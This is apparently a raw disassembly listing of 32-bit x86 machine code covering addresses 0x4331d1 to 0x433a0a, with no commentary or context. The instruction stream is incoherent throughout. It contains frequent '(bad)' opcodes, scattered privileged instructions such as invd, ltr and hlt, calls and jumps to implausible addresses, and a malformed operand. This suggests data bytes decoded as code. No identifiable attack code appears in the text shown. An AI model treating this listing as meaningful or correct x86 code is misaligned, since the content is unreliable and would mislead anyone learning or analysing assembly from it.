  4331d1:	jne    0x43315e
  4331d3:	mov    ecx,DWORD PTR [eax]
  4331d5:	in     al,0x75
  4331d7:	pop    DWORD PTR [ecx+0x5101]
  4331dd:	push   edx
  4331de:	inc    DWORD PTR [ebx]
  4331e0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4331e6:	add    BYTE PTR [edi+0x9],dl
  4331e9:	call   DWORD PTR [esi]
  4331eb:	and    dl,al
  4331ed:	and    bh,bh
  4331ef:	inc    edi
  4331f1:	test   eax,edx
  4331f3:	sldt   ebx
  4331f6:	cmp    DWORD PTR [eax],eax
  4331f8:	pushf  
  4331f9:	(bad)  
  4331fa:	jmp    0x433208
  4331fc:	mov    eax,edi
  4331fe:	or     al,0x75
  433200:	inc    eax
  433201:	call   0x432909
  433206:	mov    eax,eax
  433208:	loopne 0x43318e
  43320a:	inc    ebp
  43320b:	add    BYTE PTR [ebx+0x1451c00],cl
  433211:	mov    eax,DWORD PTR [ebp+0x20]
  433214:	add    edi,ecx
  433216:	add    BYTE PTR [eax],ch
  433218:	cmp    edi,0x18
  43321b:	test   DWORD PTR [ebp+0xf],esi
  43321e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  433225:	jne    0x433229
  433227:	call   0xffa22cec
  43322c:	leave  
  43322d:	rcr    BYTE PTR [esp+eax*4],0x55
  433231:	add    ah,ch
  433233:	add    BYTE PTR [edi-0x48fef979],dh
  433239:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  433240:	inc    esp
  433241:	mov    ebx,DWORD PTR [eax]
  433243:	fcom   st(2)
  433245:	add    BYTE PTR [edi],bl
  433247:	lea    ecx,[eax-0x18]
  43324a:	(bad)  
  43324b:	push   DWORD PTR [ecx]
  43324d:	call   0xffb57faf
  433252:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  433256:	fstp   DWORD PTR [esi+ebx*8]
  433259:	push   ebp
  43325a:	pop    ebp
  43325b:	mov    esi,DWORD PTR [edx-0x38]
  43325e:	add    DWORD PTR [eax],0x28
  433261:	mov    edi,DWORD PTR [ebx]
  433263:	xor    esi,DWORD PTR [edx+0x3]
  433266:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43326a:	pop    ebp
  43326b:	or     al,0x4
  43326d:	inc    ecx
  43326e:	push   ebp
  43326f:	(bad)  
  433270:	in     al,dx
  433271:	or     ah,ch
  433273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433274:	xbegin 0xffc8a86a
  43327a:	clc    
  43327b:	adc    al,0x45
  43327d:	idiv   BYTE PTR [ecx]
  43327f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433286:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43328c:	add    BYTE PTR [ecx+0x66],dh
  43328f:	add    eax,DWORD PTR [ebp+0x52]
  433292:	adc    eax,0x20
  433295:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43329b:	test   DWORD PTR [eax],eax
  43329d:	clc    
  43329e:	data16 or al,BYTE PTR [ebp+0x45]
  4332a2:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4332a9:	rol    BYTE PTR [ebp+0x45],1
  4332ac:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4332b2:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4332b8:	push   ebx
  4332b9:	add    BYTE PTR [ecx+0x0],dl
  4332bc:	push   ecx
  4332bd:	jge    0x4332f2
  4332bf:	add    BYTE PTR [esi+0x4],dl
  4332c2:	jne    0x433329
  4332c4:	mov    edx,0x457200
  4332c9:	jmp    0x43328d
  4332cb:	xor    edi,DWORD PTR [ebx]
  4332cd:	pop    edi
  4332ce:	cvtdq2ps xmm7,xmm0
  4332d1:	ret    0x0
  4332d4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4332da:	xor    ecx,DWORD PTR [edi]
  4332dc:	add    eax,DWORD PTR [ecx+0x3b]
  4332df:	push   ebx
  4332e0:	rdpmc  
  4332e2:	out    0x8d,al
  4332e4:	add    BYTE PTR [eax],cl
  4332e6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4332ec:	ret    0x450c
  4332ef:	sbb    al,0x8b
  4332f1:	cmp    eax,esi
  4332f3:	or     cl,al
  4332f5:	or     al,0xc2
  4332f7:	pop    eax
  4332f8:	inc    ebp
  4332f9:	add    ecx,DWORD PTR [edi]
  4332fb:	add    esi,DWORD PTR [ebp+0x39]
  4332fe:	invd   
  433300:	jge    0x43330c
  433302:	mov    eax,0x478ac0
  433307:	cli    
  433308:	xor    esp,ecx
  43330a:	mov    ebx,0x5b8ac0
  43330f:	ret    0x33
  433312:	mov    eax,0x833a8b
  433317:	sub    BYTE PTR [ebx],al
  433319:	inc    ebp
  43331a:	data16 ss clc 
  43331d:	pushf  
  43331e:	inc    bh
  433320:	mov    esp,esp
  433322:	hlt    
  433323:	test   DWORD PTR [ebp-0x8],esi
  433326:	mov    eax,DWORD PTR [ebp-0x14]
  433329:	cmp    BYTE PTR [ebx-0x76478864],cl
  43332f:	dec    edi
  433330:	or     BYTE PTR [eax],al
  433332:	jne    0x4332bd
  433334:	mov    esi,esp
  433336:	call   0x77a9befb
  43333b:	inc    ebp
  43333c:	mov    DWORD PTR [eax+0x994f0c],edi
  433342:	add    BYTE PTR [ecx-0x3ffe0717],cl
  433348:	add    BYTE PTR [esi+0x7d],ah
  43334b:	inc    ebp
  43334c:	mov    bx,WORD PTR [ebp+0x8]
  433350:	add    DWORD PTR [ebp+0x51],0x30c008b
  433357:	inc    ebp
  433358:	mov    bx,di
  43335b:	lock test BYTE PTR [ecx+0x7000801],bh
  433362:	jge    0x433325
  433364:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  43336a:	cli    
  43336b:	xor    bl,bh
  43336d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  433373:	test   BYTE PTR [eax],cl
  433375:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43337c:	cmp    ebp,eax
  43337e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433385:	test   BYTE PTR [ebp+0x1],bh
  433388:	mov    ebx,0x458a00
  43338d:	xor    esi,DWORD PTR [ebx]
  43338f:	add    esp,DWORD PTR [esi-0x77]
  433392:	pop    ebp
  433393:	loopne 0x4333fb
  433395:	inc    ebp
  433396:	clc    
  433397:	xor    edi,DWORD PTR [ebx]
  433399:	add    esi,DWORD PTR [edx-0x77]
  43339c:	data16 fdivr QWORD PTR [ebp-0x49]
  4333a0:	mov    ebx,0xb78afc
  4333a5:	hlt    
  4333a6:	xor    edi,DWORD PTR [eax]
  4333a8:	data16 add BYTE PTR [ebp+0x66],bl
  4333ac:	data16 lock clc 
  4333af:	cmp    BYTE PTR [ebx],bh
  4333b1:	add    BYTE PTR [edi+0x66],dh
  4333b4:	psubq  mm7,QWORD PTR [ebp-0x2]
  4333b8:	ltr    WORD PTR [ebp+0x66]
  4333bc:	add    esi,eax
  4333be:	add    di,WORD PTR [ebp+0x2b]
  4333c2:	data16 data16 jge 0x433443
  4333c6:	mov    ebx,0xe08a8b
  4333cb:	jge    0x433400
  4333cd:	data16 data16 xor al,0x5d
  4333d1:	data16 data16 jne 0x4333cd
  4333d5:	mov    edi,DWORD PTR [ebx]
  4333d7:	fdiv   QWORD PTR [edx+0x7d]
  4333da:	data16 data16 jge 0x433412
  4333de:	mov    ebx,0x758a66
  4333e3:	mov    esi,0x667233
  4333e8:	pop    ebp
  4333e9:	or     BYTE PTR [esi+0x0],ah
  4333ec:	clc    
  4333ed:	mov    edi,DWORD PTR [ebx]
  4333ef:	lock ja 0x43337d
  4333f2:	(bad)  
  4333f4:	jge    0x4333ed
  4333f6:	invd   
  4333f8:	pop    ebp
  4333f9:	add    BYTE PTR [ebx],al
  4333fb:	(bad)  
  4333fc:	cmp    di,WORD PTR [ebp+0xf]
  433400:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433404:	mov    bx,WORD PTR [ebp-0x10]
  433408:	pop    bp
  43340a:	fbstp  TBYTE PTR [ebx]
  43340c:	test   DWORD PTR [ebx],eax
  43340e:	add    BYTE PTR [ebx],bh
  433410:	add    BYTE PTR [esi+0x7d],ah
  433413:	jge    0x4333a0
  433415:	data16 in al,dx
  433417:	pop    ebp
  433418:	stc    
  433419:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  433420:	mov    edi,ebx
  433422:	in     al,dx
  433423:	test   BYTE PTR [ebp+0x0],bh
  433426:	mov    eax,DWORD PTR [eax]
  433428:	call   0xbd402db8
  43342d:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  433433:	sti    
  433434:	call   0x8b4bb1c4
  433439:	add    ebp,esp
  43343b:	mov    bx,di
  43343e:	jnp    0x433466
  433440:	mov    DWORD PTR [ebx+0x387df808],ecx
  433446:	mov    eax,DWORD PTR [eax]
  433448:	call   0x7c3ebfb3
  43344d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  433453:	data16 data16 fistp WORD PTR [ebp+0xe]
  433458:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  433462:	fisttp WORD PTR [ecx-0x7401f77b]
  433468:	(bad)  
  433469:	cld    
  43346a:	jne    0x4334a4
  43346c:	xor    eax,DWORD PTR [eax]
  43346e:	mov    esp,DWORD PTR [esi-0x10]
  433471:	sti    
  433472:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  433479:	data16 adc bl,bh
  43347c:	push   ebp
  43347d:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433484:	mov    WORD PTR [eax],es
  433486:	cdq    
  433487:	data16 xor bh,bl
  43348a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433490:	mov    esp,DWORD PTR [esi-0x14]
  433493:	fisttp WORD PTR [ebx-0x3748a9f2]
  433499:	or     al,0x2b
  43349b:	mov    bh,0xba
  43349d:	hlt    
  43349e:	mov    bh,bl
  4334a0:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4334a6:	dec    edi
  4334a7:	or     al,0x0
  4334a9:	mov    edi,DWORD PTR [ebx]
  4334ab:	or     BYTE PTR [ebp+0x3b],dh
  4334ae:	mov    ecx,DWORD PTR [edi]
  4334b0:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4334b6:	xor    al,0xd8
  4334b8:	pop    bp
  4334ba:	lock xor esi,DWORD PTR [ebx]
  4334bd:	lea    esp,[esi+0x1f]
  4334c0:	icebp  
  4334c1:	jb     0x4334c7
  4334c3:	add    al,al
  4334c5:	jge    0x4334d3
  4334c7:	mov    eax,eax
  4334c9:	fsubr  st,st(3)
  4334cb:	pop    ebp
  4334cc:	mov    esi,DWORD PTR [ebx]
  4334ce:	in     al,0x8d
  4334d0:	rcr    DWORD PTR [edi],0xc2
  4334d3:	jb     0x433533
  4334d5:	add    cl,cl
  4334d7:	jge    0x4334e5
  4334d9:	mov    edx,DWORD PTR [ebp-0x20]
  4334dc:	in     al,dx
  4334dd:	pop    ebp
  4334de:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4334e3:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4334e7:	mov    ebp,DWORD PTR [ebx]
  4334e9:	fdivr  QWORD PTR [esi+0x668a5d]
  4334ef:	cmp    al,0x33
  4334f1:	mov    si,0x4f7d
  4334f5:	mov    eax,DWORD PTR [eax]
  4334f7:	lock inc ebp
  4334f9:	mov    esi,DWORD PTR [edi]
  4334fb:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433502:	clc    
  433503:	(bad)  
  433504:	cmp    edi,DWORD PTR [ebx]
  433506:	je     0x433517
  433508:	push   ebx
  433509:	loopne 0x43351a
  43350b:	dec    ecx
  43350d:	mov    esp,DWORD PTR [edi-0x1c]
  433510:	int    0xf1
  433512:	mov    esi,0x703084d
  433517:	pcmpgtd mm6,mm1
  43351a:	add    BYTE PTR [ebp+0x66],dh
  43351d:	jmp    0x4334ea
  43351f:	mov    eax,DWORD PTR [ebx]
  433521:	lock push ebp
  433523:	ror    DWORD PTR [ebp-0x2972feb3],1
  433529:	or     bh,dl
  43352b:	jb     0x43352b
  43352d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  433533:	loopne 0x433535
  433535:	jne    0x433535
  433537:	data16 add BYTE PTR [esi+eiz*2],dh
  43353b:	mov    ecx,ebx
  43353d:	data16 cmp cl,dh
  433540:	add    BYTE PTR [eax],bh
  433542:	data16 add bl,cl
  433545:	data16 cmp dh,dl
  433548:	add    BYTE PTR [edx],bh
  43354a:	data16 add bl,cl
  43354d:	enterw 0x4df1,0x19
  433552:	pop    edi
  433553:	jne    0x4334d6
  433555:	mov    esi,DWORD PTR [edi]
  433557:	call   0x77b7c0f8
  43355c:	xor    ebp,DWORD PTR [ebx]
  43355e:	lea    esp,[esi+0x48]
  433561:	repnz in eax,0x3b
  433564:	add    BYTE PTR [ebp-0x37],dh
  433567:	xor    edx,DWORD PTR [ebp-0x15]
  43356a:	in     al,dx
  43356b:	xor    edx,DWORD PTR [esi+0x40]
  43356e:	mov    DWORD PTR [edi],0x338545fc
  433574:	clc    
  433575:	add    esi,DWORD PTR [esi]
  433577:	pop    edi
  433578:	pushf  
  433579:	pop    ebx
  43357a:	call   0xff443541
  43357f:	mov    edi,eax
  433581:	push   ecx
  433582:	pop    es
  433583:	mov    edi,DWORD PTR [edx]
  433585:	push   esi
  433586:	inc    esp
  433587:	(bad)  
  433588:	jle    0x43358a
  43358a:	popa   
  43358b:	data16 (bad) 
  43358d:	into   
  43358e:	addr16 cmp ch,cl
  433591:	add    BYTE PTR [ecx+0x7ce0866],bh
  433597:	cmp    ah,BYTE PTR [esi+0x0]
  43359a:	add    bh,al
  43359c:	(bad)  
  43359d:	cld    
  43359e:	add    BYTE PTR [ebp+0x36c3f866],al
  4335a4:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  4335ab:	pop    ebp
  4335ac:	or     BYTE PTR [edi+0x0],dl
  4335af:	mov    bh,0x66
  4335b1:	mov    edi,0xff038dc3
  4335b6:	jne    0x433609
  4335b8:	lea    edx,[ecx+0x1]
  4335bb:	mov    ebx,0xd64ff1
  4335c0:	sar    DWORD PTR [ebx],1
  4335c2:	test   BYTE PTR [ebp+0x32],dh
  4335c5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4335c9:	push   edi
  4335ca:	xor    BYTE PTR [ebx],0x3a
  4335cd:	mov    esi,ebx
  4335cf:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4335d5:	xor    al,BYTE PTR [ebp+0x64]
  4335d8:	pop    ebx
  4335d9:	mov    ebx,0x9c3a37
  4335de:	je     0x43360b
  4335e0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4335e6:	mov    WORD PTR [ebx],?
  4335e8:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  4335ee:	pop    edi
  4335ef:	cmp    ecx,ecx
  4335f1:	jne    0x433648
  4335f3:	mov    ebp,esp
  4335f5:	cld    
  4335f6:	push   esi
  4335f7:	pop    ebx
  4335f8:	inc    ebp
  4335f9:	stc    
  4335fa:	aaa    
  4335fb:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433602:	clc    
  433603:	test   dl,dl
  433605:	xor    al,0xff
  433607:	fs pop si
  43360a:	or     bl,al
  43360c:	dec    BYTE PTR [ebx+0x57665100]
  433612:	retf   0x3845
  433615:	aaa    
  433616:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43361d:	clc    
  43361e:	add    BYTE PTR [ebx+0x66],bl
  433621:	dec    edx
  433623:	mov    edx,DWORD PTR [edi-0x76]
  433626:	push   edi
  433627:	add    al,0xb7
  433629:	xor    al,0xba
  43362b:	cmp    al,0x8d
  43362d:	je     0x43362e
  43362f:	mov    edx,DWORD PTR [ecx-0x46]
  433632:	push   ecx
  433633:	lea    edi,[ebx+0x514fff]
  433639:	push   ecx
  43363a:	cmp    edx,DWORD PTR [ebx+0x75]
  43363d:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  433643:	add    BYTE PTR [ebx],dh
  433645:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43364b:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  433652:	mov    ebx,0x3b3a00
  433657:	jne    0x433684
  433659:	mov    DWORD PTR [ebx+0x728afc],edi
  43365f:	xor    esi,DWORD PTR [ebx]
  433661:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  433667:	push   edi
  433668:	cmp    esp,ebp
  43366a:	jne    0x43366c
  43366c:	sbb    DWORD PTR [eax],0x8085c3fc
  433672:	clc    
  433673:	inc    esp
  433674:	pop    ebx
  433675:	sti    
  433676:	add    eax,0xeb8bc075
  43367b:	cld    
  43367c:	xor    edi,DWORD PTR ds:0xf8c3855e
  433682:	mov    ecx,DWORD PTR [ecx+edx*2]
  433685:	rol    DWORD PTR [ebp-0x37],0xf
  433689:	mov    DWORD PTR [eax],ecx
  43368b:	inc    edi
  43368c:	(bad)  
  43368d:	in     eax,0x2
  43368f:	add    bh,bh
  433691:	(bad)  
  433692:	mov    esi,0xc38a5e
  433697:	mov    esi,DWORD PTR [ebx]
  433699:	push   ecx
  43369a:	mov    edi,0xfc4fc7
  43369f:	test   DWORD PTR [ebp-0x8],edx
  4336a2:	data16 ss (bad) 
  4336a5:	pushf  
  4336a6:	sub    ebp,eax
  4336a8:	inc    ebp
  4336a9:	(bad)  
  4336aa:	sub    edi,edi
  4336ac:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4336b2:	inc    ebp
  4336b3:	add    BYTE PTR [esi+0x2b],ah
  4336b6:	or     bh,BYTE PTR [edx+0xf8ac2]
  4336bc:	cmp    al,0x33
  4336be:	mov    edi,DWORD PTR [edx+0x24f81]
  4336c4:	(bad)  
  4336c5:	cmp    esi,DWORD PTR [ebx]
  4336c7:	je     0x433681
  4336c9:	push   ebx
  4336ca:	dec    edi
  4336cb:	str    ecx
  4336ce:	cmp    esp,DWORD PTR [edi+0x75]
  4336d1:	int    0x33
  4336d3:	mov    edi,0x789085f
  4336d8:	mov    ecx,DWORD PTR [eax]
  4336da:	cld    
  4336db:	add    cl,cl
  4336dd:	data16 add al,0xcb
  4336e0:	push   ebp
  4336e1:	add    ebp,esp
  4336e3:	jne    0x4336d1
  4336e5:	(bad)  
  4336e6:	mov    DWORD PTR [ecx],0xd685f7ec
  4336ec:	clc    
  4336ed:	xlat   BYTE PTR ds:[ebx]
  4336ee:	inc    ebp
  4336ef:	mov    edi,DWORD PTR [ecx]
  4336f1:	push   eax
  4336f2:	pushf  
  4336f3:	in     eax,0x8b
  4336f5:	add    ah,ch
  4336f7:	(bad)  
  4336f8:	push   ecx
  4336f9:	add    BYTE PTR [ecx+0x66],dl
  4336fc:	add    eax,0x3872cb
  433701:	add    BYTE PTR [ebp+0x66],al
  433704:	(bad)  
  433705:	retf   
  433706:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43370d:	retf   
  43370e:	cmp    cl,al
  433710:	pushf  
  433711:	jge    0x4336da
  433713:	aaa    
  433714:	cld    
  433715:	pushf  
  433716:	test   DWORD PTR [edi-0x8],ebx
  433719:	je     0x433760
  43371b:	xor    esi,DWORD PTR ds:0x7020840
  433721:	ror    BYTE PTR [ebp-0x37],0x8d
  433725:	push   ebp
  433726:	add    esp,ebp
  433728:	jb     0x4336b5
  43372a:	add    BYTE PTR [eax],cl
  43372c:	dec    ebp
  43372d:	mov    bh,0x81
  43372f:	push   esi
  433730:	push   ecx
  433731:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  433738:	xor    al,BYTE PTR [eax]
  43373a:	mov    edx,DWORD PTR [edi+0x10]
  43373d:	(bad)  
  43373e:	scas   eax,DWORD PTR es:[edi]
  43373f:	cmp    bh,BYTE PTR [ebx]
  433741:	add    BYTE PTR [edi],cl
  433743:	mov    ebp,ebp
  433745:	cld    
  433746:	add    BYTE PTR [ebx],bh
  433748:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43374c:	dec    ebp
  43374d:	or     BYTE PTR [ebx],ch
  43374f:	ret    0x458b
  433752:	lock jmp 0x433746
  433755:	mov    ecx,DWORD PTR [eax]
  433757:	or     BYTE PTR [edi],al
  433759:	mov    ecx,eax
  43375b:	xor    DWORD PTR [edx+0x2],0x0
  43375f:	mov    bh,0xc1
  433761:	adc    BYTE PTR [eax],dh
  433763:	iret   
  433764:	inc    ebp
  433765:	mov    DWORD PTR [ebx],0x4dfff8c5
  43376b:	inc    BYTE PTR [ebx]
  43376d:	cmp    bh,al
  43376f:	add    BYTE PTR [ecx],dl
  433771:	data16 adc al,bh
  433774:	dec    ecx
  433775:	fisttp WORD PTR [ecx+0x456604c0]
  43377b:	add    dh,BYTE PTR ds:0x75e0845
  433781:	ret    0x4d
  433784:	lea    ecx,[ebx+0x18728301]
  43378a:	add    BYTE PTR [ebp+0x45],al
  43378d:	ss jmp 0x10a382f
  433793:	call   0xf8cebcdd
  433798:	clc    
  433799:	inc    ebp
  43379a:	shl    DWORD PTR ds:0x781084d,0x51
  4337a1:	cdq    
  4337a2:	push   ecx
  4337a3:	xor    al,BYTE PTR [ecx+0x32f89989]
  4337a9:	inc    ebp
  4337aa:	cmp    edi,DWORD PTR [esi]
  4337ac:	jbe    0x43374a
  4337ae:	mov    eax,edi
  4337b0:	or     ah,dh
  4337b2:	inc    ebp
  4337b3:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4337b9:	cmp    BYTE PTR [ebx-0x74747664],cl
  4337bf:	in     al,dx
  4337c0:	hlt    
  4337c1:	push   ecx
  4337c2:	push   ecx
  4337c3:	push   ecx
  4337c4:	push   ecx
  4337c5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4337cb:	cdq    
  4337cc:	cdq    
  4337cd:	xor    dh,BYTE PTR [edx]
  4337cf:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4337d5:	or     BYTE PTR [ebp+0x7],al
  4337d8:	mov    eax,ecx
  4337da:	clc    
  4337db:	jb     0x43379e
  4337dd:	add    BYTE PTR [ebp+0x55],cl
  4337e0:	or     DWORD PTR [edi],0xc251d151
  4337e6:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  4337f0:	mov    edi,eax
  4337f2:	or     cl,al
  4337f4:	inc    ebp
  4337f5:	dec    ebp
  4337f6:	mov    eax,DWORD PTR [ecx+0x514d510c]
  4337fc:	or     WORD PTR [ecx],0x8999
  433801:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433807:	mov    edx,DWORD PTR [ecx+0x8]
  43380a:	mov    eax,DWORD PTR [ebp-0x8]
  43380d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433814:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43381a:	inc    ebp
  43381b:	dec    eax
  43381c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  433822:	add    edx,DWORD PTR [ecx-0x8]
  433825:	mov    ecx,DWORD PTR [ecx]
  433827:	clc    
  433828:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  43382f:	mov    ecx,ebp
  433831:	clc    
  433832:	(bad)  
  433833:	popf   
  433834:	inc    DWORD PTR [eax]
  433836:	ret    0x8b
  433839:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43383f:	mov    edi,esp
  433841:	hlt    
  433842:	test   ecx,esi
  433844:	clc    
  433845:	or     BYTE PTR [ebp+0x7],al
  433848:	cmp    ecx,eax
  43384a:	pushf  
  43384b:	jb     0x433880
  43384d:	add    BYTE PTR [eax-0x3f],al
  433850:	inc    eax
  433851:	daa    
  433852:	inc    ebp
  433853:	inc    ebp
  433854:	xor    eax,0x7f80803
  433859:	dec    ebp
  43385a:	cdq    
  43385b:	add    esi,DWORD PTR [edx]
  43385d:	clc    
  43385e:	cmp    DWORD PTR [ecx],ecx
  433860:	or     al,0x8
  433862:	add    al,BYTE PTR [ebp+0x2c]
  433865:	xor    eax,0x7350845
  43386a:	or     BYTE PTR [ebp+0x7],cl
  43386d:	lea    ebx,[ecx-0x748dcdff]
  433873:	add    BYTE PTR [eax*2-0x74b21438],cl
  43387a:	mov    edx,DWORD PTR [eax]
  43387c:	cld    
  43387d:	dec    ebp
  43387e:	push   ecx
  43387f:	sub    edx,DWORD PTR [ecx-0x75]
  433882:	add    eax,0xf172fc
  433887:	or     BYTE PTR [ebp+0x7],cl
  43388a:	add    eax,ecx
  43388c:	or     al,0x72
  43388e:	add    DWORD PTR [eax],eax
  433890:	mov    ebx,0x29c2c1
  433895:	inc    ebp
  433896:	mov    eax,DWORD PTR [ebx]
  433898:	cmp    eax,0x3004d1c
  43389e:	xbegin 0x66c8c498
  4338a4:	clc    
  4338a5:	or     BYTE PTR [ebp+0x45],al
  4338a8:	cmp    DWORD PTR ds:0x78b089c,esi
  4338ae:	adc    BYTE PTR [ebp+0x45],cl
  4338b1:	lea    eax,[ebp+0x33727501]
  4338b7:	add    cl,ch
  4338b9:	inc    ebp
  4338ba:	add    bl,ch
  4338bc:	add    BYTE PTR [ebx+0x45850845],cl
  4338c2:	je     0x43384f
  4338c4:	push   ebx
  4338c5:	or     al,0x85
  4338c7:	dec    ebp
  4338c8:	std    
  4338c9:	mov    bh,bh
  4338cb:	mov    BYTE PTR [ebp-0x75],al
  4338ce:	mov    edi,eax
  4338d0:	or     al,0x89
  4338d2:	inc    ebp
  4338d3:	clc    
  4338d4:	mov    esp,esp
  4338d6:	hlt    
  4338d7:	call   DWORD PTR [edi-0x37]
  4338da:	push   ecx
  4338db:	or     al,0x51
  4338dd:	push   ebp
  4338de:	xor    ebp,esp
  4338e0:	mov    esi,0x457251
  4338e5:	ss (bad) 
  4338e7:	pushf  
  4338e8:	inc    ebp
  4338e9:	(bad)  
  4338ea:	mov    edi,eax
  4338ec:	or     al,0x85
  4338ee:	add    al,bh
  4338f0:	inc    eax
  4338f2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4338f6:	or     ah,bh
  4338f8:	inc    eax
  4338f9:	push   ecx
  4338fa:	jmp    0x43394d
  4338fc:	mov    eax,DWORD PTR ds:0xe8720c
  433902:	mov    DWORD PTR [ebp-0x8],eax
  433905:	jne    0x43394c
  433907:	jmp    0x433894
  433909:	mov    ebp,DWORD PTR [eax]
  43390b:	clc    
  43390c:	retf   0xff51
  43390f:	push   ecx
  433910:	mov    DWORD PTR ds:0x757210,eax
  433916:	mov    ecx,DWORD PTR [ebp-0x4]
  433919:	sub    esp,DWORD PTR [ebx-0x77]
  43391c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  433923:	or     ah,bh
  433925:	pop    es
  433926:	ds cdq 
  433928:	push   DWORD PTR [edx]
  43392a:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  433930:	(bad)  
  433931:	mov    bh,bh
  433933:	jmp    0x433921
  433935:	leave  
  433936:	jne    0x433940
  433938:	call   0x303292
  43393d:	in     al,dx
  43393e:	dec    ebp
  43393f:	add    dh,BYTE PTR [ebx]
  433941:	add    BYTE PTR [ebx],al
  433943:	inc    ebp
  433944:	cmp    esi,DWORD PTR [esi]
  433946:	je     0x4338e4
  433948:	mov    eax,edi
  43394a:	or     al,0xf0
  43394c:	add    BYTE PTR [ebp+0x458bf845],al
  433952:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  433958:	adc    al,0x7
  43395a:	enter  0x9fc0,0xa5
  43395e:	rol    BYTE PTR [eax],0x5e
  433961:	mov    ecx,ecx
  433963:	or     al,0xc
  433965:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  43396c:	jmp    0x43396d
  43396e:	push   ebp
  43396f:	mov    esp,ebp
  433971:	cld    
  433972:	inc    ebp
  433973:	inc    ebp
  433974:	or     DWORD PTR [ecx+0x457dec10],0x0
  43397b:	push   esi
  43397c:	push   esi
  43397d:	mov    edi,0x7af080f
  433982:	add    bh,al
  433984:	test   DWORD PTR [ecx+0x3a7320f],ebx
  43398a:	add    BYTE PTR [ecx+0x4540100f],cl
  433990:	mov    ebp,eax
  433992:	mov    ebp,edi
  433994:	lock call edx
  433997:	fcom   DWORD PTR [ebp+0x45]
  43399a:	mov    eax,0x148a8b
  43399f:	push   ecx
  4339a0:	enter  0xc145,0x83
  4339a4:	cmp    cl,BYTE PTR [eax]
  4339a6:	add    BYTE PTR [ebp+0x4d],al
  4339a9:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4339af:	call   0xffa3351e
  4339b4:	cmp    eax,DWORD PTR [ebp-0xc]
  4339b7:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4339bb:	push   ebp
  4339bc:	(bad)
  4339bf:	std    
  4339c0:	lock push DWORD PTR [edi+0x5d08fcdb]
  4339c7:	inc    ebp
  4339c8:	(bad)  
  4339c9:	call   0xff7d3659
  4339ce:	add    al,BYTE PTR [ebp+0x37]
  4339d1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  4339d7:	jne    0x4339d9
  4339d9:	(bad)  
  4339da:	cmp    edi,esp
  4339dc:	jne    0x433a0f
  4339de:	mov    edi,edi
  4339e0:	or     BYTE PTR [ebx-0x307f0b49],cl
  4339e6:	pop    ds
  4339e7:	into   
  4339e8:	je     0x4339ab
  4339ea:	mov    ebx,DWORD PTR [esi]
  4339ec:	or     BYTE PTR [ebp-0x49],al
  4339ef:	mov    esp,DWORD PTR [esi-0x77]
  4339f2:	mov    esi,0xfe451f0c
  4339f7:	mov    eax,DWORD PTR [eax]
  4339f9:	or     al,0x66
  4339fb:	sar    bl,0x3b
  4339fe:	xor    esi,DWORD PTR [ebp+0x66]
  433a01:	xor    ecx,edi
  433a03:	pop    edi
  433a04:	adc    bl,BYTE PTR [ebx+0x7e]
  433a07:	ret    0xff
  433a0a:	cld    
